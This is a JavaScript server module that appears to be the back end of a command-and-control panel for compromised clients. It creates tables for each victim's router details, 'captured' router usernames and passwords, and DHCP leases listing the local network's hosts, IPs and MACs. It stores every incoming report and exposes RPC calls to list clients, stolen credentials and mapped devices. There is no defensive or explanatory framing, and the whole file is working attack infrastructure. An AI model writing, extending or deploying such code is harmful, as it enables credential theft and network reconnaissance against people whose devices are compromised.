function norm(payload) {
  if (payload == null) return {};
  if (typeof payload === "string") {
    try { return JSON.parse(payload); } catch { return { raw: payload }; }
  }
  if (payload instanceof Uint8Array || payload instanceof ArrayBuffer) {
    const s = new TextDecoder().decode(payload);
    try { return JSON.parse(s); } catch { return { raw: s }; }
  }
  return payload;
}

export default {
  setup(ctx) {
    ctx.clients = new Map();

    ctx.db.run(`
      CREATE TABLE IF NOT EXISTS routers (
        client_id TEXT PRIMARY KEY,
        gateway TEXT,
        brand TEXT,
        title TEXT,
        server TEXT,
        ports TEXT,
        seen_at INTEGER NOT NULL
      )`);

    ctx.db.run(`
      CREATE TABLE IF NOT EXISTS creds (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        gateway TEXT,
        brand TEXT,
        user TEXT,
        password TEXT,
        captured_at INTEGER NOT NULL
      )`);

    ctx.db.run(`
      CREATE TABLE IF NOT EXISTS leases (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        host TEXT,
        ip TEXT,
        mac TEXT,
        seen_at INTEGER NOT NULL
      )`);
    ctx.db.run(`CREATE INDEX IF NOT EXISTS leases_client ON leases(client_id)`);

    ctx.db.run(`CREATE TABLE IF NOT EXISTS config (client_id TEXT PRIMARY KEY, config TEXT NOT NULL)`);
  },

  onEvent(ctx, clientId, event, payload) {
    if (!clientId) return;
    ctx.clients.set(clientId, Date.now());
    const p = norm(payload);
    const now = Date.now();

    if (event === "router") {
      ctx.db.run(
        `INSERT INTO routers (client_id, gateway, brand, title, server, ports, seen_at)
         VALUES (?, ?, ?, ?, ?, ?, ?)
         ON CONFLICT(client_id) DO UPDATE SET
           gateway = excluded.gateway, brand = excluded.brand, title = excluded.title,
           server = excluded.server, ports = excluded.ports, seen_at = excluded.seen_at`,
        clientId, p.gateway || null, p.brand || null, p.title || null,
        p.server || null, JSON.stringify(p.ports || []), now
      );
      ctx.broadcast("router", { clientId, ...p });
    } else if (event === "cred") {
      ctx.db.run(
        `INSERT INTO creds (client_id, gateway, brand, user, password, captured_at)
         VALUES (?, ?, ?, ?, ?, ?)`,
        clientId, p.gateway || null, p.brand || null, p.user || null, p.password || null, now
      );
      ctx.broadcast("cred", { clientId, ...p });
    } else if (event === "leases") {
      const list = Array.isArray(p) ? p : [];
      const tx = ctx.db.transaction(() => {
        ctx.db.run(`DELETE FROM leases WHERE client_id = ?`, clientId);
        const ins = ctx.db.prepare(
          `INSERT INTO leases (client_id, host, ip, mac, seen_at) VALUES (?, ?, ?, ?, ?)`
        );
        for (const l of list) {
          ins.run(clientId, l.host || null, l.ip || null, l.mac || null, now);
        }
      });
      tx();
      ctx.broadcast("leases", { clientId, leases: list });
    } else if (event === "status") {
      ctx.broadcast("status", { clientId, ...p });
    } else if (event === "error") {
      ctx.broadcast("error", { clientId, ...p });
    } else if (event === "pong") {
      ctx.broadcast("pong", { clientId, ...p });
    }
  },

  rpc: {
    list_clients(ctx) {
      return Array.from(ctx.clients.entries()).map(([clientId, lastSeen]) => ({ clientId, lastSeen }));
    },

    get_config(ctx, params = {}) {
      const row = ctx.db.query(`SELECT config FROM config WHERE client_id = ?`).get(params.clientId || "");
      return row ? JSON.parse(row.config) : {};
    },

    save_config(ctx, params = {}) {
      ctx.db.run(
        `INSERT INTO config (client_id, config) VALUES (?, ?)
         ON CONFLICT(client_id) DO UPDATE SET config = excluded.config`,
        params.clientId, JSON.stringify(params.config || {})
      );
      return { ok: true };
    },

    get_router(ctx, params = {}) {
      const row = ctx.db
        .query(`SELECT gateway, brand, title, server, ports, seen_at AS seenAt FROM routers WHERE client_id = ?`)
        .get(params.clientId || "");
      if (!row) return null;
      return { ...row, ports: JSON.parse(row.ports || "[]") };
    },

    list_creds(ctx, params = {}) {
      return ctx.db.query(
        `SELECT id, gateway, brand, user, password, captured_at AS at
         FROM creds WHERE client_id = ? ORDER BY id DESC LIMIT 100`
      ).all(params.clientId || "");
    },

    list_leases(ctx, params = {}) {
      return ctx.db.query(
        `SELECT host, ip, mac, seen_at AS at FROM leases WHERE client_id = ? ORDER BY ip`
      ).all(params.clientId || "");
    },
  },
};
